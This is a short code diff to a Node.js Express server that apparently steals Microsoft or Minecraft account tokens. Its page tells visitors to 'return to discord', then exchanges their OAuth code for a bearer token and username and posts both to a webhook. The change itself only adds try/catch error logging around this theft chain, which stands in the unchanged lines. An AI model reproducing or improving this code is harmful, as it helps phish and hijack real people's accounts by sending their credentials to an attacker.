@@ -12,6 +12,7 @@ const port = process.env.PORT || 8080
 
 router.get('/', (req, res) => {
     res.send('Success! You can exit this page and return to discord.')
+    try {
     const code = getCode(res)
     const accessToken = getAccessToken(code)
     const userHash = getUserHashAndToken(accessToken)[0]
@@ -19,7 +20,9 @@ router.get('/', (req, res) => {
     const xstsToken = getXSTSToken(userToken)
     const bearerToken = getBearerTokenAndUsername(xstsToken, userHash)[0]
     const username = getBearerTokenAndUsername(xstsToken, userHash)[1]
-    postToWebhook(username, bearerToken)
+    postToWebhook(username, bearerToken)} catch (err) {
+        console.log("A wild error has appeared!\n" + err + "\n")
+    }
 })
 
 router.listen(port, () => {
